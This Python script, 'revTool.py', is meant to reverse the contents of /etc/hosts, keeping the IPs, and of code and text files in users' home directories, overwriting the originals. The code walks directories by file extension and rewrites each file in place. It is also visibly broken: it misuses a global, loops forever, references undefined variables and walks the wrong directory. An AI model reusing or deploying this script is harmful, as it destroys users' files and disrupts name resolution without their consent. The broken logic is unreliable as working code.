# Shannon McHale
# revTool.py
# April 14th, 2019
# The purpose of the rev tool is to take a file (in this case /etc/host and everything in the home directory)
# and reverse all the content in it except for the IPs 

# The rev utility copies the specified files to standard output,
# reversing the order of characters in every line.  If no files are
# specified, standard input is read.

# x is the file being passed in
import os
import random 
from pathlib import Path

global new_data
#x = "./hosts"
x = "/home"

new_data = "" #stores data to be copied back into file

"""Reverse any file"""
def reverse(filename):

    with open(filename) as fil:
        lines = fil.readlines()

    for line in lines:
        print(line)

            #skip and store blank lines
        if len(line) == 0:
            new_data += "\n"
            continue

            #store comments
        if line.startswith("#"):
            new_data += line
            continue
        
        line = [line[::-1] for lines in line]      #reverses strings
        line = " ".join(line)
        new_data += "{}\n".format(line)
  
    with open(filename, 'w') as fil:                #writes new_data into OG file
        fil.write(new_data)

"""Get users from home directory"""
def homies(path):
    # get homies

    # get all names and store in an array?
    # iterate through array and add to variable using a count 
    path = "/home"
    homies = os.listdir(path)

    print(homies)

    for homie in homies:
        revFiles(homie)

"""Gets files from user directory"""
def revFiles(homie):                                #pass in any username
    
    #array of extensions
    extensions = ['.py', '.txt', '.tools', '.bash', '.c', '.sh', '.h']

    for root, dirs, files in os.walk("."):  
        for filename in files:
            ext = os.path.splitext(filename)
            ext = os.path.splitext(filename)[1]

            while True:
                ext in extensions
                reverse(filename)


"""Reverses RANDOM lines in file"""
def randReverse(f):
    with open(f) as fil:
        lines = fil.read().splitlines()
    
    myline = random.choice(lines)
    myline = [myline[::-1] for lines in line]  

    with open(filename, 'w') as fil: 
        fil.write(new_data)


"""Reverses /ETC/HOSTS/"""
def ectHosts(filename):

    with open(filename) as fil:
        lines = fil.readlines()    
    
        for line in f.readlines():

            #skip and store blank lines
            if len(line) == 0:
                new_data += "\n"
                continue

            #store comments
            if line.startswith("#"):
                new_data += line
                continue

        
            line = line.split()  #split by space
            ip = line[0]         #first string is an IP
            hosts = line[1:]     #Everything but the IP goes into Hosts array
            
            
            hosts = [host[::-1] for host in hosts]      #reverses strings un host array
            hosts = " ".join(hosts)
            new_data += "{}\t{}\n".format(ip, hosts)

            #append into file?
    f.close()
    f = open(x, "w")   
    f.write(new_data)
    f.close() 


print(new_data)
#f = open(x, "w")
#f.write(new_data)
#f.close() 